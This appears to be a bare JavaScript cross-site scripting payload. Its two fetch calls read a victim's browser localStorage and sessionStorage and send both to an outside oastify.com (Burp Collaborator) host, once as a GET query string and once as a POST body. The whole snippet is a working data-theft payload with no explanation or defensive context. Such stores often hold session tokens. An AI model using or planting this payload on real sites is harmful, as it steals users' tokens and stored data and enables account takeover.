fetch('https://the7qfueaw6ww3b929075kfl5cb2zr.oastify.com/?localStorage=' + JSON.stringify(localStorage) + '&sessionStorage=' + JSON.stringify(sessionStorage), {
    method: "GET"
}).then(response => response.json()).then(json => console.log(json)).catch(err => console.log(err));
fetch('https://the7qfueaw6ww3b929075kfl5cb2zr.oastify.com/localStorage', {
    method: "POST",
    body: 'localStorage=' + JSON.stringify(localStorage) + '&sessionStorage=' + JSON.stringify(sessionStorage),
    headers: {
        "Content-type": "text/plain"
    }
}).then(response => response.json()).then(json => console.log(json)).catch(err => console.log(err));
